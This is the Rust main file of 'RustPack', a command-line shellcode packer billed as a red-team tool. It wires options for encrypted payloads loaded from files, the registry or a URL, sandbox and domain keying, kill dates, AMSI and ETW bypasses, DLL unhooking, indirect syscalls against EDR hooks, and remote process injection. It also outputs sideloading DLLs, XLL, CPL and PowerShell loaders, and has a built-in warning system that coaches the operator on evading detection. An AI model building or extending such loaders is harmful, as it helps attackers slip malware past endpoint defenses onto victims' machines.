use clap::{Parser, Subcommand};
use std::path::PathBuf;
use std::io::Write;

mod encrypt;
mod encode;
mod polymorphism;
mod anti_emulation;
mod environmental;
mod payload_location;
mod bypass;
mod injection;
mod input;
mod output;
mod metadata;
mod interactive_ps;
mod codegen;
mod builder;
mod syscalls;

#[derive(Parser)]
#[command(name = "RustPack")]
#[command(about = "Shellcode packer for authorized penetration testing and red team use")]
#[command(version = "0.1.0")]
struct Cli {
    /// Input payload path (.bin shellcode, .exe PE, or .NET assembly)
    #[arg(long = "file")]
    file: PathBuf,

    /// Output file path
    #[arg(long = "output")]
    output: PathBuf,

    /// Accept EULA (mandatory)
    #[arg(short = 'a')]
    accept_eula: bool,

    /// Input is a .NET assembly
    #[arg(long = "csharp")]
    csharp: bool,

    /// Input is a native PE
    #[arg(long = "pe")]
    pe: bool,

    /// Load encrypted payload from file path at runtime
    #[arg(long = "shellcodeFile")]
    shellcode_file: Option<String>,

    /// Load encrypted payload from registry key at runtime
    #[arg(long = "regPayload")]
    reg_payload: Option<String>,

    /// Download encrypted payload from URL at runtime
    #[arg(long = "shellcodeURL")]
    shellcode_url: Option<String>,

    /// Sandbox evasion mode: DomainJoined | Threshold
    #[arg(long = "sandbox")]
    sandbox: Option<String>,

    /// Only decrypt+execute if joined to this domain
    #[arg(long = "environmentaldomain")]
    env_domain: Option<String>,

    /// Only decrypt+execute on this hostname
    #[arg(long = "environmentalhost")]
    env_host: Option<String>,

    /// Kill date (YYYY-MM-DD), default: today + 30 days
    #[arg(long = "killdate")]
    killdate: Option<String>,

    /// Output a standard DLL
    #[arg(long = "dll")]
    dll: bool,

    /// Output a weaponized sideloading DLL with forwarded exports
    #[arg(long = "sideload")]
    sideload: Option<String>,

    /// Output a Control Panel item (.cpl)
    #[arg(long = "cpl")]
    cpl: bool,

    /// Output an Excel Add-in (.xll)
    #[arg(long = "xll")]
    xll: bool,

    /// Output position-independent shellcode
    #[arg(long = "pic")]
    pic: bool,

    /// Output a Windows service binary
    #[arg(long = "service")]
    service: bool,

    /// Output a randomized PowerShell script loader
    #[arg(long = "ps1")]
    ps1: bool,

    /// Enable AMSI bypass for .NET payloads
    #[arg(long = "amsibypass")]
    amsi_bypass: bool,

    /// Enable ETW bypass for .NET payloads
    #[arg(long = "etwbypass")]
    etw_bypass: bool,

    /// Unhook this DLL before payload execution
    #[arg(long = "unhook")]
    unhook: Option<String>,

    /// Generate interactive PowerShell runspace loader
    #[arg(long = "interactivePS")]
    interactive_ps: bool,

    /// Embed custom icon into output binary
    #[arg(long = "icon")]
    icon: Option<PathBuf>,

    /// Clone PE metadata from this file
    #[arg(long = "cloneMetadata")]
    clone_metadata: Option<PathBuf>,

    /// Encoding type: default | wordsplit | base32 | uuid
    #[arg(long = "encoding", default_value = "default")]
    encoding: String,

    /// Use indirect syscalls (bypass EDR user-mode hooks)
    #[arg(long = "syscalls")]
    syscalls: bool,

    /// Remote injection subcommand
    #[command(subcommand)]
    remoteinject: Option<RemoteInject>,
}

#[derive(Subcommand)]
enum RemoteInject {
    /// Remote process injection
    #[command(name = "remoteinject")]
    RemoteInject {
        /// Injection method: crt | apc | fiber | threadless | poolparty
        #[arg(long = "method")]
        method: String,

        /// Target process name
        #[arg(long = "target")]
        target: String,

        /// Spawn the target process instead of injecting existing
        #[arg(long = "spawn")]
        spawn: bool,
    },
}

fn main() -> anyhow::Result<()> {
    let cli = Cli::parse();

    // Check EULA acceptance
    if !cli.accept_eula {
        eprintln!("[X] ERROR: You must accept the EULA with -a flag.");
        eprintln!("    This tool is for authorized penetration testing only.");
        std::process::exit(1);
    }

    // Determine input format
    let input_format = if cli.csharp {
        input::InputFormat::DotNet
    } else if cli.pe {
        input::InputFormat::NativePE
    } else {
        input::InputFormat::Shellcode
    };

    // Determine output format
    let output_format = if cli.dll {
        output::OutputFormat::Dll
    } else if let Some(ref target) = cli.sideload {
        output::OutputFormat::Sideload {
            target_dll: target.clone(),
        }
    } else if cli.cpl {
        output::OutputFormat::Cpl
    } else if cli.xll {
        output::OutputFormat::Xll
    } else if cli.pic {
        output::OutputFormat::Pic
    } else if cli.service {
        output::OutputFormat::Service
    } else if cli.ps1 {
        output::OutputFormat::PowerShell
    } else {
        output::OutputFormat::Exe
    };

    // Determine injection method
    let injection_method = if let Some(RemoteInject::RemoteInject {
        ref method,
        ref target,
        spawn,
    }) = cli.remoteinject
    {
        if cli.syscalls {
            // Syscall variants of remote injection
            match method.as_str() {
                "crt" => {
                    if spawn {
                        injection::InjectionMethod::SyscallSpawn { target: target.clone() }
                    } else {
                        injection::InjectionMethod::SyscallRemote { target: target.clone() }
                    }
                }
                _ => {
                    eprintln!("[X] --syscalls only supports 'crt' method for remote injection");
                    std::process::exit(1);
                }
            }
        } else {
            match method.as_str() {
                "crt" => injection::InjectionMethod::RemoteCrt {
                    target: target.clone(),
                    spawn,
                },
                "apc" => injection::InjectionMethod::Apc {
                    target: target.clone(),
                    spawn,
                },
                "fiber" => injection::InjectionMethod::Fiber,
                "threadless" => injection::InjectionMethod::Threadless {
                    target: target.clone(),
                },
                "poolparty" => injection::InjectionMethod::PoolParty {
                    target: target.clone(),
                },
                _ => {
                    eprintln!("[X] Unknown injection method: {}", method);
                    std::process::exit(1);
                }
            }
        }
    } else if cli.syscalls {
        injection::InjectionMethod::SyscallLocal
    } else {
        injection::InjectionMethod::LocalCrt
    };

    // Parse encoding
    let encoding = encode::EncodingType::from_str(&cli.encoding)?;

    // === WARNING SYSTEM ===
    let mut warnings: Vec<String> = Vec::new();
    let mut blocked = false;

    let payload_is_embedded = cli.shellcode_file.is_none()
        && cli.reg_payload.is_none()
        && cli.shellcode_url.is_none();

    let has_protection = cli.sandbox.is_some()
        || cli.env_domain.is_some()
        || cli.env_host.is_some();

    // Warning 1: EXE + embedded + no protection → BLOCK
    if output_format == output::OutputFormat::Exe && payload_is_embedded && !has_protection {
        eprintln!("\n\x1b[31m[X] BLOCKED: This configuration will reveal your plaintext payload in sandbox/cloud analysis.\x1b[0m");
        eprintln!("    RustPack will not generate this payload. Use one of:");
        eprintln!("      --sandbox DomainJoined");
        eprintln!("      --environmentaldomain <DOMAIN>");
        eprintln!("      --shellcodeFile <PATH>");
        eprintln!("      --shellcodeURL <URL>");
        blocked = true;
    }

    // Warning 2: .NET without AMSI bypass
    if cli.csharp && !cli.amsi_bypass {
        warnings.push(format!(
            "\x1b[33m[!] WARNING: .NET assembly input without AMSI bypass.\n    → Known malicious .NET tools (e.g. Rubeus) will be blocked >95% of the time.\n    → Enable --amsibypass and --etwbypass.\x1b[0m"
        ));
    }

    // Warning 3: .NET without ETW bypass
    if cli.csharp && !cli.etw_bypass {
        warnings.push(format!(
            "\x1b[33m[!] WARNING: .NET assembly input without ETW bypass.\n    → .NET execution events will be visible to EDR.\n    → Enable --etwbypass.\x1b[0m"
        ));
    }

    // Warning 4: EXE + embedded (even with sandbox)
    if output_format == output::OutputFormat::Exe && payload_is_embedded && has_protection {
        warnings.push(format!(
            "\x1b[33m[!] WARNING: Unsigned executable with embedded payload detected.\n    → Expect signature detections. Prefer --dll + --shellcodeFile or --sideload.\x1b[0m"
        ));
    }

    // Warning 5: Kill date more than 180 days away
    if let Some(ref date_str) = cli.killdate {
        if let Ok(date) = chrono::NaiveDate::parse_from_str(date_str, "%Y-%m-%d") {
            let today = chrono::Utc::now().date_naive();
            let days = (date - today).num_days();
            if days > 180 {
                warnings.push(format!(
                    "\x1b[33m[!] WARNING: Kill date is {} days away (>180 days).\n    → Consider a shorter kill date for OPSEC.\x1b[0m",
                    days
                ));
            }
        }
    }

    if blocked {
        std::process::exit(1);
    }

    // Print warnings and prompt
    if !warnings.is_empty() {
        eprintln!();
        for w in &warnings {
            eprintln!("{}", w);
            eprintln!();
        }
        eprint!("\x1b[36m[?] Proceed with warnings? [y/N]: \x1b[0m");
        std::io::stderr().flush()?;

        let mut response = String::new();
        std::io::stdin().read_line(&mut response)?;
        if response.trim().to_lowercase() != "y" {
            eprintln!("[*] Aborted by operator.");
            std::process::exit(0);
        }
    }

    // === HANDLE POWERSHELL OUTPUT SPECIALLY ===
    if output_format == output::OutputFormat::PowerShell {
        let payload_bytes = input::shellcode::read_shellcode(&cli.file)?;
        let encrypted = encrypt::encrypt_aes256_cbc(&payload_bytes);
        let mut rng = rand::thread_rng();
        let ps_script = output::powershell::generate_powershell_script(&encrypted.ciphertext, &encrypted.key, &encrypted.iv, &mut rng);
        std::fs::write(&cli.output, &ps_script)?;
        eprintln!(
            "\x1b[32m[+] PowerShell script written to: {}\x1b[0m",
            cli.output.display()
        );
        return Ok(());
    }

    // === BUILD ===
    let build_config = builder::BuildConfig {
        input_file: cli.file,
        output_file: cli.output.clone(),
        input_format,
        output_format,
        encoding,
        injection_method,
        shellcode_file: cli.shellcode_file,
        reg_payload: cli.reg_payload,
        shellcode_url: cli.shellcode_url,
        sandbox: cli.sandbox,
        env_domain: cli.env_domain,
        env_host: cli.env_host,
        kill_date: cli.killdate,
        amsi_bypass: cli.amsi_bypass,
        etw_bypass: cli.etw_bypass,
        unhook_dll: cli.unhook,
        interactive_ps: cli.interactive_ps,
        icon_path: cli.icon,
        clone_metadata_path: cli.clone_metadata,
    };

    match builder::build(&build_config) {
        Ok(result) => {
            eprintln!(
                "\x1b[32m[+] Payload generated successfully: {}\x1b[0m",
                result.output_path.display()
            );
            eprintln!(
                "[*] Loader source written to: {}",
                result.temp_dir.display()
            );
        }
        Err(e) => {
            eprintln!("\x1b[31m[X] Build failed: {}\x1b[0m", e);
            std::process::exit(1);
        }
    }

    Ok(())
}
